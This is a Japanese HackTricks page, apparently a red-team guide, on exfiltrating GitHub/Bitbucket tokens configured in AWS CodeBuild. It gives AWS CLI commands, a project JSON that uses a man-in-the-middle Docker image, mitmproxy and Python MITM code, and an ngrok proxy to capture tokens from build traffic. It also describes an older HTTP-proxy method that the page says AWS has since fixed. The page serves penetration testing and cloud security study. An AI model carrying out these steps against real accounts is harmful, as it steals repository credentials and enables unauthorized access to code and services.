# AWS Codebuild - トークンの漏洩

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>でAWSハッキングをゼロからヒーローまで学ぶ</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

- **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
- [**公式PEASS＆HackTricksのスウェグ**](https://peass.creator-spring.com)を手に入れる
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
- **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**または[telegramグループ](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォロー**する
- **ハッキングテクニックを共有するために、PRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) **および** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のGitHubリポジトリに提出**してください。

</details>

## Github/Bitbucketで構成されたトークンの回復

最初に、漏洩させる可能性のあるソース資格情報が構成されていないかを確認します：
```bash
aws codebuild list-source-credentials
```
### Dockerイメージを介して

例えば、GitHubへの認証がアカウントに設定されていることがわかった場合、プロジェクトのビルドを実行するためにCodeBuildが特定のDockerイメージを使用するように設定することで、そのアクセス（GHトークンまたはOAuthトークン）を**外部に持ち出す**ことができます。

この目的のために、新しいCodeBuildプロジェクトを作成するか、既存のプロジェクトの**環境を変更**して**Dockerイメージ**を設定できます。

使用できるDockerイメージは[https://github.com/carlospolop/docker-mitm](https://github.com/carlospolop/docker-mitm)です。これは非常に基本的なDockerイメージで、**`https_proxy`**、**`http_proxy`**、**`SSL_CERT_FILE`**の**環境変数を設定**します。これにより、**`https_proxy`**および**`http_proxy`**で指定されたホストのほとんどのトラフィックを傍受し、**`SSL_CERT_FILE`**で指定されたSSL証明書を信頼できます。

1. **独自のDocker MitMイメージを作成してアップロード**
   * リポジトリの手順に従ってプロキシIPアドレスを設定し、SSL証明書を設定して**Dockerイメージをビルド**します。
   * メタデータエンドポイントへのリクエストを傍受しないように、**`http_proxy`を設定しないでください**。
   * `ngrok tcp 4444`のように**`ngrok`**を使用してプロキシをホストに設定できます。
   * Dockerイメージをビルドしたら、それを**パブリックリポジトリ**（Dockerhub、ECRなど）に**アップロード**します。
2. **環境を設定**
   * **新しいCodeBuildプロジェクト**を作成するか、既存のプロジェクトの環境を**変更**します。
   * プロジェクトが**以前に生成されたDockerイメージ**を使用するように設定します。

<figure><img src="../../../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

3. **ホストでMitMプロキシを設定**

* **Githubリポジトリ**で指示されているように、次のようなものを使用できます：
```bash
mitmproxy --listen-port 4444  --allow-hosts "github.com"
```
{% hint style="success" %}
**mitmproxyのバージョンは9.0.1**を使用しましたが、バージョン10では動作しない可能性が報告されています。
{% endhint %}

4. **ビルドを実行して資格情報をキャプチャする**

* **Authorization**ヘッダーでトークンを見ることができます：

<figure><img src="../../../../.gitbook/assets/image (273).png" alt=""><figcaption></figcaption></figure>

これは、aws cliから次のような方法で行うこともできます

{% code overflow="wrap" %}
```bash
# Create project using a Github connection
aws codebuild create-project --cli-input-json file:///tmp/buildspec.json

## With /tmp/buildspec.json
{
"name": "my-demo-project",
"source": {
"type": "GITHUB",
"location": "https://github.com/uname/repo",
"buildspec": "buildspec.yml"
},
"artifacts": {
"type": "NO_ARTIFACTS"
},
"environment": {
"type": "LINUX_CONTAINER", // Use "ARM_CONTAINER" to run docker-mitm ARM
"image": "docker.io/carlospolop/docker-mitm:v12",
"computeType": "BUILD_GENERAL1_SMALL",
"imagePullCredentialsType": "CODEBUILD"
}
}

## Json

# Start the build
aws codebuild start-build --project-name my-project2
```
{% endcode %}

### ~~HTTPプロトコル経由~~

{% hint style="success" %}
**この脆弱性は2023年2月20日の週（おそらく金曜日）にAWSによって修正されました。したがって、攻撃者はこれをもう悪用できません :)**
{% endhint %}

**CodeBuildで昇格された権限を持つ攻撃者は、構成されたGithub/Bitbucketトークンを漏洩**することができます。また、OAuth経由で権限が構成されている場合は、**コードにアクセスするために使用される一時的なOAuthトークン**を漏洩させることができます。

* 攻撃者は、CodeBuildプロジェクトに環境変数**http\_proxy**と**https\_proxy**を追加し、それを自分のマシンを指すように設定できます（例: `http://5.tcp.eu.ngrok.io:14972`）。

<figure><img src="../../../../.gitbook/assets/image (232).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (213).png" alt=""><figcaption></figcaption></figure>

* 次に、githubリポジトリのURLをHTTPSではなくHTTPを使用するように変更します。例: \*\*http://\*\*github.com/carlospolop-forks/TestActions
* 次に、プロキシ変数（http\_proxyおよびhttps\_proxy）が指すポートで[https://github.com/synchronizing/mitm](https://github.com/synchronizing/mitm)の基本例を実行します。
```python
from mitm import MITM, protocol, middleware, crypto

mitm = MITM(
host="127.0.0.1",
port=4444,
protocols=[protocol.HTTP],
middlewares=[middleware.Log], # middleware.HTTPLog used for the example below.
certificate_authority = crypto.CertificateAuthority()
)
mitm.run()
```
* 最後に、**プロジェクトをビルド**をクリックすると、**資格情報**がmitmポートに**クリアテキスト**（base64）で送信されます：

<figure><img src="../../../../.gitbook/assets/image (159).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
これで攻撃者は自分のマシンからトークンを使用し、それが持つすべての特権をリストアップし、CodeBuildサービスを直接使用するよりも簡単に（悪用）することができます。
{% endhint %}

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong>でAWSハッキングをゼロからヒーローまで学ぶ</summary>

HackTricksをサポートする他の方法：

* **HackTricksで企業を宣伝したい**か**HackTricksをPDFでダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォロー**する
* **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングテクニックを共有する

</details>
